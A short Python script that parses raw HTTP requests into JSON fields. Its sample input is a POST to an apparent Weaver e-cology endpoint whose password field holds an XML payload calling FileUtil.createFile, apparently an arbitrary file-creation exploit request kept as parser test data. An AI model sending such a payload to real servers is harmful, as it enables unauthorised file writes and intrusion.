from urllib.parse import urlparse, parse_qs

import base64
import picohttpparser 

raw_request = (
    b"GET /path?name=Alice&age=30'aaa=112222 HTTP/1.1\r\n"
    b"Host: example.com\r\n"
    b"Content-Type: text/plain\r\n\r\n"
    # b"body content ffffffffffffffff"
)


def parser_req_raw_example(request_raw):
    parsed = picohttpparser.parse_http_request(request_raw)
    req_body = parsed["body"] 
    
    uri_parsed = urlparse(parsed["path"])    
    return dict(
        cgi=uri_parsed.path, 
        cgi_full=parsed["path"], 
        args=parse_qs(uri_parsed.query), 
        method=parsed["method"], 
        http_version=parsed["version"], 
        headers=parsed["headers"],
        body_base64=base64.b64encode(req_body).decode() if req_body else "", 
        body_decode_cnt=req_body.decode() if req_body else "", 
    )
    


if __name__ == "__main__":
    raw1 = """POST /api/hrm/secondarypwd/checkPassword HTTP/1.1
Host: 192.168.174.194
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ecology_JSessionid=aaaxhM3zmQNLdfYsrKIyz; __randcode__=2fdf8165-801c-4904-a809-6b92e8d2b8ea; languageidweaver=7; loginuuids=29; JSESSIONID=aaaxhM3zmQNLdfYsrKIyz; loginidweaver=29
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 364

password=<root pagesize="10" pageIndex="1" tabletype="checkbox"><checkboxpopedom showmethod="com.api.integration.util.FileUtil.createFile" popedompara='C:/yfsapwqexqwe'><checkboxList></checkboxList></checkboxpopedom><head></head><sql sqlprimarykey="IMAGEFILEID" backfields="IMAGEFILEID" sqlform="IMAGEFILE" sqlsortway="sqlsortway"><sqlhint>1</sqlhint></sql></root>
"""
    
    result = parser_req_raw_example(request_raw=raw1) 
    import json 
    print(json.dumps(result, indent=2))
